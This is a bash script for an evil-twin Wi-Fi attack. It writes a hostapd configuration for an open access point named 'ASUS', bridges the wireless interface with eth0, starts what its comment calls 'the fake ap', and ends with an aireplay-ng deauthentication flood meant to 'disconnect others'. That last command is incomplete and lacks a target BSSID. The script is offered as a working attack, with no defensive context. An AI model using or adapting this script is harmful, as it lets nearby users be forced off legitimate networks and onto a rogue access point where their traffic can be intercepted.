#!/bin/bash

# Edit the /etc/hostapd/hostapd.conf configuration file
iface=$(sudo airmon-ng | grep "Ralink")
iface=${iface:0:5}
{
  echo "interface=$iface"
  echo "driver=nl80211"
  echo "ssid=ASUS"
  echo "channel=6"
} > /etc/hostapd/hostapd.conf

# Create the bridge and add the interfaces to it
sudo ip addr flush dev eth0
sudo iw dev $iface set 4addr on
sudo brctl addbr br0
sudo brctl addif br0 eth0 $iface
sudo ifconfig br0 down
sudo ifconfig br0 up

# Start the fake ap
sudo hostapd /etc/hostapd/hostapd.conf

#Disconnect others
sudo aireplay-ng --deauth 0 -a
